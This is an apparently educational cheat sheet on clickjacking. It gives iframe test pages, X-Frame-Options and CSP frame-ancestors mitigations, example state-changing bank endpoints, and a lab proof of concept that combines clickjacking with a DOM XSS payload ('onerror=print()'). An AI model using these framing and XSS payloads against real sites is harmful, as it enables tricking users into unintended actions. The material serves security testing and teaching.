### Simple Clickjacking Vulnerability

Below is an example of HTML code demonstrating a simple clickjacking vulnerability:

```html
<html>
<h3>This is my web page.</h3>
<iframe src="https://www.example.com" width="500" height="500"></iframe>
<p>If this window is not blank, the iframe source URL can be framed!</p>
</html>
```

If response headers like `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN` are present, clickjacking cannot be exploited.

### CSP Mitigation for UI Redressing

Content Security Policy (CSP) can be used to mitigate UI redressing attacks. Examples of CSP policies that can be used to prevent clickjacking are:

- `Content-Security-Policy: frame-ancestors 'none';`
- `Content-Security-Policy: frame-ancestors 'self';`

### Identifying State-Changing Requests

Look for state-changing requests in the context of a clickjacking vulnerability. Examples of state-changing requests include:

- Changing the password: `bank.example.com/password_change`
- Transferring balance: `bank.example.com/transfer_money`
- Unlinking an external account: `bank.example.com/unlink`

### Clickjacking Code Example

Here is an example of HTML code that demonstrates clickjacking:

```html
<html>
<head>
    <title>Clickjack test page</title>
</head>
<body>
    <p>Web page is vulnerable to clickjacking if the iframe is populated with the target page!</p>
    <iframe src="URL_OF_TARGET_PAGE" width="500" height="500"></iframe>
</body>
</html>
```

### Clickjacking via DOM XSS Proof of Concept

An example of clickjacking via DOM XSS is demonstrated in the code below:

```html
<style>
    iframe {
        position: relative;
        width: $width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position: absolute;
        top: $top_value;
        left: $side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

Please note that nowadays, clickjacking vulnerabilities are not typically accepted by Bug Bounty platforms, but they can still be used in combination with other vulnerabilities to create a more significant impact.
